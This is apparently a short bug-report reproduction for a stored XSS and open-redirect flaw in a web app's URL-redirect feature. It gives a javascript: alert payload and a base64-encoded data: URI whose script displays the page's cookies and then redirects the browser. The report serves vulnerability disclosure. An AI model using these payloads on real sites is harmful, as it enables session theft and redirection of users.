To Reproduce:

1. Click Add Url Redirect
2. set page for redirect
3. add redirects as: 
javascript:alert(document.domain)
or data:text/html;base64,PHNjcmlwdD5hbGVydCgiY29va2llIHN0ZWFsOiAiK2RvY3VtZW50LmNvb2tpZSk7d2luZG93LmxvY2F0aW9uLmhyZWY9J2h0dHA6Ly93d3cuZ29vZ2xlLmNvbSc7PC9zY3JpcHQ+
(XSS and URL redirect)
4. A new redirect link created
5. Click on link
